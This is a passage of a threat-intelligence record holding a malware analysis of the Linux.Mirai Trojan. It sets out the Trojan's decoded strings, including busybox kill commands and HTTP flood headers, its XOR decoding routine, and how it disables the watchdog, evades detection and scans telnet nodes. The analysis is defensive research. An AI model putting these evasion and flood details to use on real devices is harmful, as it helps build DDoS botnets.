%s:%s\"|runkiller|\n|13|\"HTTPFLOOD\"|runkiller|\n|14|\"LOLNOGTFO\"|runkiller|\n|15|\"\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\"|runkiller|\n\n\n-----\n\n|Number|Value|Purpose|\n|---|---|---|\n|16|\"zollard\"|runkiller|\n|17|\"GETLOCALIP\"||\n|18|Host||\n|19|Port||\n|20|\"shell\"||\n|21|\"enable\"||\n|22|\"system\"||\n|23|\"sh\"||\n|24|\"/bin/busybox MIRAI\"||\n|25|\"MIRAI: applet not found\"||\n|26|\"ncorrect\"||\n|27|\"/bin/busybox ps\"||\n|28|\"/bin/busybox kill -9 \"||\n|29|\"TSource Engine Query\"||\n|30|\"/etc/resolv.conf\"||\n|31|\"nameserver\"||\n|32|\"Connection: keep-alive\"||\n|33|\"Accept: text/html,application/xhtml+xml,applic- ation/xml;q=0.9,image/webp,*/*;q=0.8\"||\n|34|\"Accept-Language: en-US,en;q=0.8\"||\n|35|\"Content-Type: application/x-www-form-urlen- coded\"||\n|36|\"setCookie('\"||\n|37|\"refresh:\"||\n|38|\"location:\"||\n|39|\"set-cookie:\"||\n|40|\"content-length:\"||\n\n\n-----\n\n|Number|Value|Purpose|\n|---|---|---|\n|41|\"transfer-encoding:\"||\n|42|\"chunked\"||\n|43|\"keep-alive\"||\n|44|\"connection:\"||\n|45|\"server: dosarrest\"||\n|46|\"server: cloudflare-nginx\"||\n|47|\"Mozilla/5.0 (Windows NT 10.0; WOW64) Ap- pleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"|User Agent|\n|48|\"Mozilla/5.0 (Windows NT 10.0; WOW64) Ap- pleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"|User Agent|\n|49|\"Mozilla/5.0 (Windows NT 6.1; WOW64) Ap- pleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"|User Agent|\n|50|\"Mozilla/5.0 (Windows NT 6.1; WOW64) Ap- pleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\"|User Agent|\n|51|\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\"|User Agent|\n\n\nAll samples of the Trojan use a function that hides the following strings:\n```\n def decode(str_enc):\n  return \"\".join([chr(ord(x) ^ 0x22) for x in str_enc])\n\n```\nOnce launched, the Trojan removes its executable file from the disk, blocks the SIGINT signal with the\nhelp of sigprocmask, and sets the parameter SIG_IGN for SIGCHLD and a handler for SIGTRAP.\n\nThen the Trojan tries to open the /dev/watchdog file for reading/writing (/dev/misc/watchdog is\nalso checked) and, if successful, disables the watchdog timer.\n```\n ioctl(fd, WDIOC_SETOPTION, WDIOS_DISABLECARD)\n\n```\nThe Trojan subsequently opens a root folder and sends a request to the address 8.8.8.8:53 to get the IP\naddress of its network traffic.\n\n\n-----\n\nNext, the Trojan calculates a function taken from the argv[0] value:\n```\n def check(name):\n   print name\n   a = [ord(x) for x in name]\n   sum = (0 - 0x51) & 0xff\n   for i in [2,4,6,8,10,12]:\n     z = (~a[i % len(a)] & 0xff)\n     sum = (sum + z)&0xff\n     #print \"%x %x %x\" % (z, sum, sum % 9)\n   return sum % 9\n\n```\nThis function returns a number from 0 to 8 that represents an index in a function array:\n```\n off_8055DC0   dd offset bind_socket  ; DATA XREF: main+109o\n .rodata:08055DC4           dd offset sub_80517E0\n .rodata:08055DC8           dd offset sub_8051730\n .rodata:08055DCC           dd offset create_config\n .rodata:08055DD0           dd offset sub_8051760\n .rodata:08055DD4           dd offset sub_80523F0\n .rodata:08055DD8           dd offset strcopy\n .rodata:08055DDC           dd offset runkiller\n .rodata:08055DE0           dd offset sub_804E900\n\n```\nIf argv[0] == “./dvrHelper”, a parental process receives the SIGTRAP signal (for which a handler was\npreviously installed). The handler, in turn, modifies the IP address taken from the configuration and the\nC&C server’s port to which the Trojan will connect.\n\nThen a listening socket is opened at the address 127.0.0.1:48101. If this port is busy with another process, the Trojan runs a function that finds the process and kills it.\n\nThe Trojan subsequently generates a name that looks like a random sequence containing the characters\n\n[a-z 0-9] and writes it to argv[0]. Using the prctl function, the process’s name is changed to a random\none.\n\nNext, the Trojan creates child processes and terminates the parental one. All further steps are performed\nin a child process—in particular, a structure containing handlers is filled in. Then a function responsible\nfor scanning telnet nodes and a function that terminates the processes of other Trojans are launched.\nThe Trojan then runs a handler for incoming instructions sent from the C&C server. If the Trojan detects\nthat a connection to a local server is being established, it runs a child process to scan vulnerable telnet\nnodes and terminates the parental process.\n\nThe pictures below show a code fragments for Linux.DDoS.87 and Linux.Mirai.\n\n\n-----\n\n**Code fragment for Linux.DDoS.87**\n\n**Code fragment for Linux.Mirai**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://st.drweb.com/static/new-www/news/2016/september/Investigation_of_Linux.Mirai_Trojan_family_en.pdf"
    ],
    "report_names": [
        "Investigation_of_Linux.Mirai_Trojan_family_en.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1475243421,
    "ts_modification_date": 1475243421,
    "files": {
        "pdf": "https://archive.orkl.eu/60a662ddec30c427e34154cf534ddcfba19db921.pdf",
        "text": "https://archive.orkl.eu/60a662ddec30c427e34154cf534ddcfba19db921.txt",
        "img": "https://archive.orkl.eu/60a662ddec30c427e34154cf534ddcfba19db921.jpg"
    }
}